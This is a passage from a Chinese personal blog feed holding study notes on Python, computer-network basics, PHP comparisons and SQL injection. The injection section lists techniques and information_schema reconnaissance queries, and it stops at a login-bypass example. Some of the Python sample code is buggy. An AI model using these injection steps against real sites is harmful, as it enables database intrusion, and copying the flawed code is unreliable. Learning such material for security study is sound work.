getOption()<br><br>    <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要加密的内容：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(Base64.encode(string))<br>    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要解密的内容：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(Base64.decode(string))<br>    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要加密的内容：&quot;</span>)<br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;你要加密几次？：&quot;</span>))          <span class="hljs-comment"># !这里可以做类型检查</span><br>        <span class="hljs-built_in">print</span>(Base64.encode_n(string, n))<br>    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">4</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要解密的内容：&quot;</span>)<br>        answer,count=Base64.decode_n(string)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;你的密文一共加密<span class="hljs-subst">&#123;count&#125;</span>次,结果是：<span class="hljs-subst">&#123;answer&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计网基本概念</title>
    <link href="/2023/10/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <url>/2023/10/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="因特网"><a href="#因特网" class="headerlink" title="因特网"></a>因特网</h1><h2 id="计算机网络在信息时代的作用"><a href="#计算机网络在信息时代的作用" class="headerlink" title="计算机网络在信息时代的作用"></a>计算机网络在信息时代的作用</h2><ol><li><p>常见的三种网络</p><ul><li>电信网络</li><li>计算机网络</li><li>有线电视网路</li></ul><p>其中计算机网络是最重要的</p></li><li><p>互联网的两个基本特点</p><p><strong>连通性</strong>和<strong>共享</strong></p></li><li><p>互联网是由数量极大的各种计算机网络互相连接起来的</p></li></ol><h2 id="互联网概述"><a href="#互联网概述" class="headerlink" title="互联网概述"></a>互联网概述</h2><h3 id="网路的网络"><a href="#网路的网络" class="headerlink" title="网路的网络"></a>网路的网络</h3><ol><li><p>网络是由若干<strong>结点</strong>和连接他们的<strong>链路</strong>组成的</p></li><li><p>计算机网络是由多个<strong>结点</strong>和<strong>链路组成</strong></p><p>结点可以是计算机，集线器，或者路由去</p></li><li><p>互联网是网路的网路</p></li><li><p>Inter网基于isp<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="网络运营商，在中国有，中国电信，移动，联通">[1]</span></a></sup></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231018105708360.png" alt="image-20231018105708360"></p><p>主机在边缘部分作用是<strong>信息处理</strong></p><p>路由器在核心部分，作用是<strong>按存储转发的方式进行分组交换</strong></p><p>一个用户只要买了路由器或者调节器之类的设备就可以成为ISP</p></li></ol><h3 id="互联网基础发生的三个阶段"><a href="#互联网基础发生的三个阶段" class="headerlink" title="互联网基础发生的三个阶段"></a>互联网基础发生的三个阶段</h3><ol><li><p>internet是互连网，通用名词，泛指的是网络。互连网之间的通信协议可以任意选择，不一定是TCP&#x2F;IP</p></li><li><p>Internet是互联网，专用名词，特指全球最大的互连网。互联网采用的是tcp&#x2F;ip协议</p></li><li><p>现在的互联网是多层次的ISP<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="网络运营商，在中国有，中国电信，移动，联通">[1]</span></a></sup>结构</p><p>分为，主干isp，地区isp，本地isp</p></li><li><p>上网就是接入互联网，主机必须要有ip才能上网</p></li><li><p>万维网：就是基于互联网的一种信息共享服务，浏览网页就是使用的是万维网。但是邮件系统不是使用这个系统</p></li></ol><h3 id="互联网的标准化工作"><a href="#互联网的标准化工作" class="headerlink" title="互联网的标准化工作"></a>互联网的标准化工作</h3><p>存在于互联网的pfc文档</p><h2 id="互联网的组成"><a href="#互联网的组成" class="headerlink" title="互联网的组成"></a>互联网的组成</h2><p>按工作方式分可以分为核心部分和边缘部分</p><ol><li>边缘部分：由连接到互联网的<strong>主机</strong>组成，作用是<strong>进行信息处理</strong></li><li>核心部分：连接到网络的<strong>路由器</strong>组成，<strong>按存储转发的方式进行分组交换</strong></li></ol><h3 id="边缘部分"><a href="#边缘部分" class="headerlink" title="边缘部分"></a>边缘部分</h3><ol><li>主机又称为端系统，个人电脑，摄像头，手机等</li><li>边缘部分通过核心部分提供的服务进行通信，这一般就成为<strong>计算机之间的通信</strong></li></ol><h3 id="核心部分"><a href="#核心部分" class="headerlink" title="核心部分"></a>核心部分</h3><p>核心部分最重要的功能就是分组交换，主要是路由器</p><p>路由器是实现分组交换的关键构建，用于转发分组</p><h4 id="三种交换方式"><a href="#三种交换方式" class="headerlink" title="三种交换方式"></a>三种交换方式</h4><ol><li><p>电路交换</p><p>例子就是电话的之间的通信，使用一个电话交换机 </p><p>如果暂时没有使用的话，他也是占用了物理资源，所以对于计算机这种突发的信息并不适用</p></li><li><p>分组交换</p><p>最重要的交换机是路由器，依然采用了存储转发的方式</p><p>分组交换就是将一个报文分成不同小的部分，在进行发送</p><p>首部：里面包含了目的地址、源地址等控制信息</p></li><li><p>报文交换已经被分组交换替代</p><p>整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个结点。</p></li><li><p>三种分组方式的比较</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231018115013403.png" alt="image-20231018115013403"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/sql/image-20231018114245320.png" alt="image-20231018114245320"></p></li></ol><h2 id="计算机网络的定义"><a href="#计算机网络的定义" class="headerlink" title="计算机网络的定义"></a>计算机网络的定义</h2><p>  络的定义</p><p>计算机网络并非专门用来传递数据，还支持很多应用</p><h3 id="几种不同类型的计算机网络"><a href="#几种不同类型的计算机网络" class="headerlink" title="几种不同类型的计算机网络"></a>几种不同类型的计算机网络</h3><ul><li><strong>广域网WAN</strong>：互联网的核心部分，连接广域网各节点一般使用的是高速链路</li><li>城域网MAN：城域网采用的是以太网技术，常作为局域网讨论</li><li>局域网LAN：校园网和企业网都是属于局域网</li></ul><h2 id="计算机网络的性能"><a href="#计算机网络的性能" class="headerlink" title="计算机网络的性能"></a>计算机网络的性能</h2><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><ol><li><p>速率</p><p>单位是bit&#x2F;s</p><p>比特</p><p>1G速率是指的是1Gbit&#x2F;s  不是1Gbyte&#x2F;s，一般指的是额定的速率或标称的速率 </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023131237595.png" alt="image-20231023131237595"></p><p>由于单位之间换算的问题，我们需要留意，相同的单位对应的值并不是一样的</p><p>但是为了方便计算，可以直接约掉</p></li><li><p>带宽</p><p>单位是:赫兹(hz)</p><p>带宽的两种意义：</p><ul><li>某个信号具有的频带宽度，是一个赫兹范围。表示某信道允许通过的信号频带范围就称为该信道的带宽。是<strong>频域称谓</strong></li><li>计算机网络中的带宽表示网络某通道的发送数据的能力，网络带宽表示单位内网络的某行到所能通过的<strong>最高数据率</strong>，是<strong>时域称谓</strong></li></ul></li><li><p>吞吐量</p><p>单位时间通过某个网络的（信道或者接口）的数据量</p><p>吞吐量受网络的带宽或额定速率的限制</p></li><li><p>时延</p><p>发送时延  网络时延传播时延处理时延（一般忽略）</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023132813588.png" alt="image-20231023132813588"></p><p>时延和设备也是有关系的，需要做到就是匹配各种设备之间的大小，以达到性能利用率最大</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023132527697.png" alt="image-20231023132527697"></p><p><strong>发送时延</strong></p><p>主机发送数据消耗的时间</p><p><strong>处理时延</strong></p><p>收到分组的数据，主机选哟花费时间处理和分析这些数据</p><p><strong>传播时延</strong></p><p>信道&#x2F;电磁波传播速率</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023132618188.png" alt="image-20231023132618188"></p><p>当不考虑处理时延的时候不能判断出 哪种时延占主要（传播时延，发送时延）</p></li><li><p>时延带宽积</p><p>传播时延*带宽</p></li><li><p>往返时间</p></li><li><p>利用率</p><ul><li><p>信道利用率</p><p>信道有百分之几是被利用的</p></li><li><p>网络利用率</p><p>全网络的信道的利用率的加权平均值</p></li></ul><p>利用率并不是越高越好，主机或路由器在收到分组时要花费时间处理数据，如分析分组的首部，从分组中提取数据部分，差错检验等等。</p></li><li><p>丢包率</p><p>传输的分组数量&#x2F;总包的数量</p><p>丢包率反映了网络的拥堵情况</p><p><img src="D:\hexo\source_posts\计算机网络\计网基本概念.assets\image-20231023134002895-16980396344451.png" alt="image-20231023134002895"></p></li></ol><h2 id="计算机的网络结构"><a href="#计算机的网络结构" class="headerlink" title="计算机的网络结构"></a>计算机的网络结构</h2><h3 id="常见的计算机网络结构"><a href="#常见的计算机网络结构" class="headerlink" title="常见的计算机网络结构"></a>常见的计算机网络结构</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023134327224.png" alt="image-20231023134327224"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023134437075.png" alt="image-20231023134437075"></p><p>由于osi体系结构并没有发展起来所以现在用的多的还是tcp&#x2F;ip体系结构</p><p>但是由于教学我们学习5层结构</p><h3 id="分层的必要性"><a href="#分层的必要性" class="headerlink" title="分层的必要性"></a>分层的必要性</h3><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023135252553.png" alt="image-20231023135252553"></p><p>针对每一个部分可以提出不同的解决方案</p><h2 id="计算机网络专用术语"><a href="#计算机网络专用术语" class="headerlink" title="计算机网络专用术语"></a>计算机网络专用术语</h2><ol><li><p>协议</p><p>协议的三要素</p><ul><li><p>语义</p><p>定义要完成的操作</p></li><li><p>语法</p><p>交换信息的格式</p></li><li><p>同步</p></li></ul></li><li><p>服务访问点</p><ul><li><p>数据链路层</p><p>帧</p></li><li><p>网络层</p><p>ip  协议字段</p></li><li><p>运输层</p><p>端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023141040700.png" alt="image-20231023141040700"></p></li></ul></li></ol><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>网络运营商，在中国有，中国电信，移动，联通<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>面向对象进阶</title>
    <link href="/2023/10/17/python/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BF%9B%E9%98%B6/"/>
    <url>/2023/10/17/python/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="slots-魔术"><a href="#slots-魔术" class="headerlink" title="_slots_魔术"></a>_slots_魔术</h1><p>由于python是一门动态语言<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="允许我们在运行的时候，绑定新的方法和属性">[1]</span></a></sup>，所以我们可以使用_slots_魔术限定，就是只能邦定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-comment"># 限定Person对象只能绑定_name, __age和__sex属性</span><br>    _slots_ = (<span class="hljs-string">&quot;__name&quot;</span>, <span class="hljs-string">&quot;__age&quot;</span>, <span class="hljs-string">&quot;__sex&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex</span>) -&gt; <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 后置返回值</span><br>        self.__name = name<br>        self.__age = age<br>        self.__sex = sex<br></code></pre></td></tr></table></figure><h1 id="静态方法和类方法"><a href="#静态方法和类方法" class="headerlink" title="静态方法和类方法"></a>静态方法和类方法</h1><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>通过直接在类里面def 的方式结果都是类方法，下面是如何创建一个静态方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex, school</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__(name, age, sex)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        self.__school = school<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.__name<br>    <br><span class="hljs-meta">    @staticmethod </span><span class="hljs-comment"># 静态方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_age</span>():<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.__age<br></code></pre></td></tr></table></figure><h2 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h2><p>类方法代表了与类本身信息相关的函数，第一个参数规定了是<code>cls</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@classmethod  </span><span class="hljs-comment"># 类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getClassName</span>(<span class="hljs-params">cls</span>):<br>        <span class="hljs-keyword">return</span> cls.__name__<br></code></pre></td></tr></table></figure><h1 id="类之间的关系"><a href="#类之间的关系" class="headerlink" title="类之间的关系"></a>类之间的关系</h1><ul><li>is-a关系也叫继承或泛化，比如学生和人的关系、手机和电子产品的关系都属于继承关系。</li><li>has-a关系通常称之为关联，比如部门和员工的关系，汽车和引擎的关系都属于关联关系；关联关系如果是整体和部分的关联，那么我们称之为聚合关系；如果整体进一步负责了部分的生命周期（整体和部分是不可分割的，同时同在也同时消亡），那么这种就是最强的关联关系，我们称之为合成关系。</li><li>use-a关系通常称之为依赖，比如司机有一个驾驶的行为（方法），其中（的参数）使用到了汽车，那么司机和汽车的关系就是依赖关系。</li></ul><h1 id="继承和多态"><a href="#继承和多态" class="headerlink" title="继承和多态"></a>继承和多态</h1><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-comment"># 限定Person对象只能绑定_name, __age和__sex属性</span><br>    _slots_ = (<span class="hljs-string">&quot;__name&quot;</span>, <span class="hljs-string">&quot;__age&quot;</span>, <span class="hljs-string">&quot;__sex&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex</span>) -&gt; <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 后置返回值</span><br>        self.__name = name<br>        self.__age = age<br>        self.__sex = sex<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex, school</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__(name, age, sex)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        self.__school = school<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.__name<br><br><span class="hljs-meta">    @staticmethod  </span><span class="hljs-comment"># 静态方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_age</span>():<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.__age<br><br><span class="hljs-meta">    @classmethod  </span><span class="hljs-comment"># 类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getClassName</span>(<span class="hljs-params">cls</span>):<br>        <span class="hljs-keyword">return</span> cls.__name__<br></code></pre></td></tr></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>我们也可以对一个父类函数进行重写，当多个子类的调用同一个方法的结果不一样，这个就是多态</p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>一定要引入abc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> abc<br><br><span class="hljs-comment"># 注意构建的时候 metaclass=abc.ABCMeta</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-built_in">object</span>, metaclass=abc.ABCMeta):<br>    <span class="hljs-string">&quot;&quot;&quot;宠物&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, nickname</span>):<br>        self._nickname = nickname<br><br><span class="hljs-meta">    @abc.abstractmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">make_voice</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;发出声音&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>允许我们在运行的时候，绑定新的方法和属性<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php随记</title>
    <link href="/2023/10/14/PHP/php%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/10/14/PHP/php%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>‘’&#x3D;=‘’和”=&#x3D;&#x3D;”的区别</p><ul><li><p>‘&#x3D;&#x3D;’</p><p>执行弱类型比较</p><p>比较值，不比较类型</p></li><li><p>‘&#x3D;&#x3D;&#x3D;’</p><p>执行强类型比较</p><p>比较值和类型</p></li></ul></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/10/14/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/10/14/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h1><h1 id="sql-挖掘"><a href="#sql-挖掘" class="headerlink" title="sql 挖掘"></a>sql 挖掘</h1><p>先实现网站本身的基础功能</p><p>然后发现有注入点的时候，进行测试</p><ol><li><p>是否存在 联合注入</p><p>就是判断字符型还是数字型…</p><p>看一下回显位</p></li><li><p>报错注入</p><p>看是否存在报错</p></li><li><p>时间盲注</p><p>看是否回沉睡</p></li></ol><h1 id="SQL基础"><a href="#SQL基础" class="headerlink" title="SQL基础"></a>SQL基础</h1><h2 id="了解sql"><a href="#了解sql" class="headerlink" title="了解sql"></a>了解sql</h2><ol><li><p>注释</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 一定要加一个空格</span><br></code></pre></td></tr></table></figure></li><li><p>表示相等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 使用`=`</span><br></code></pre></td></tr></table></figure></li><li><p>sql信息表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">infomation_schema<br></code></pre></td></tr></table></figure></li></ol><h2 id="使用系统函数得到信息"><a href="#使用系统函数得到信息" class="headerlink" title="使用系统函数得到信息"></a>使用系统函数得到信息</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> version();  <span class="hljs-comment">-- 返回数据库的版本</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();  <br><br><span class="hljs-keyword">select</span> DATABASE();  <span class="hljs-comment">-- 这个经常使用</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">CURRENT_USER</span>(); <span class="hljs-comment">-- 当前用户</span><br><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@datadir</span>;  <span class="hljs-comment">-- 数据库的地址  这个返回的是一个文件路径</span><br><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>_compile_os; <span class="hljs-comment">-- 返回当前系统的版本</span><br><br><br><span class="hljs-comment">-- 系统的用户</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SYSTEM_USER</span>();<br></code></pre></td></tr></table></figure><h2 id="使用infomation-schema查看信息"><a href="#使用infomation-schema查看信息" class="headerlink" title="使用infomation_schema查看信息"></a>使用infomation_schema查看信息</h2><ol><li><p>查看所有的数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.SCHEMATA;<br></code></pre></td></tr></table></figure></li><li><p>表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.TABLES;<br></code></pre></td></tr></table></figure></li><li><p>列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `COLUMN_NAME` <span class="hljs-keyword">FROM</span> information_schema.COLUMNS <span class="hljs-keyword">WHERE</span> TABLE_NAME <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%h%&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>数据库表的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT `TABLE_NAME` FROM information_schema.TABLES;<br></code></pre></td></tr></table></figure></li><li><p>查看该表属于什么数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * from information_schema.TABLES WHERE `TABLE_NAME` = &#x27;test_data&#x27;;<br><br></code></pre></td></tr></table></figure></li><li><p>字段的名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> COLUMN_NAME<br><span class="hljs-keyword">FROM</span><br>    information_schema.COLUMNS<br><span class="hljs-keyword">where</span> `TABLE_NAME` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;student&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>infomation_schema常用的字段名称</p><ul><li><code>schema_name</code>所有的数据表</li><li>table_schema 当前表的数据库</li><li>table_name 表的名称</li><li>column_name 字段的名称</li></ul></li></ol><h2 id="sql-注入常用的函数"><a href="#sql-注入常用的函数" class="headerlink" title="sql 注入常用的函数"></a>sql 注入常用的函数</h2><ol><li><p>concat(str1,”分隔符” ,str2)</p><p>concat(str1,str2,str3)</p></li><li><p>group_concat(field_username1,field_username2…)</p><p>将多行查询的结果以逗号隔开全部输出 （将多行转换成一行输出）</p></li><li><p>substr(),substring(),mid()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUBSTR((DATABASE()),0,10);<br></code></pre></td></tr></table></figure><p>从0，开始，采取10个字节</p></li><li><p>left(“string”,size)</p><p>从左边开始size个字节</p></li><li><p>right(“string”,size)</p><p>从右边开始size个字节</p></li><li><p>locate(substr,str)</p><p>返回substr在str中第一次出现的位置</p></li><li><p><code>limit</code>和<code>offset</code> 限制查询显示的行数</p></li><li><p>rand()</p><p>随机数</p><p><code>select rand()</code></p></li><li><p>floor()</p><p>向下取整数</p></li></ol><h1 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h1><h2 id="根据变量分"><a href="#根据变量分" class="headerlink" title="根据变量分"></a>根据变量分</h2><ol><li>字符型</li><li>数字型</li></ol><h2 id="根据位置分"><a href="#根据位置分" class="headerlink" title="根据位置分"></a>根据位置分</h2><ol><li>get</li><li>post</li><li>http</li></ol><h2 id="根据手法分"><a href="#根据手法分" class="headerlink" title="根据手法分"></a>根据手法分</h2><ol><li>联合注入</li><li>报错注入</li><li>bool盲注</li><li>时间盲注（延迟注入）</li><li>堆叠注入</li><li>二次注入</li><li>宽字节注入</li></ol><h1 id="有可能存在的地方"><a href="#有可能存在的地方" class="headerlink" title="有可能存在的地方"></a>有可能存在的地方</h1><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>如果登录框存在万能密码登录的话，就可以判断存在sql注入的漏洞</p><p>当我们输入用户名和密码的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from admin where 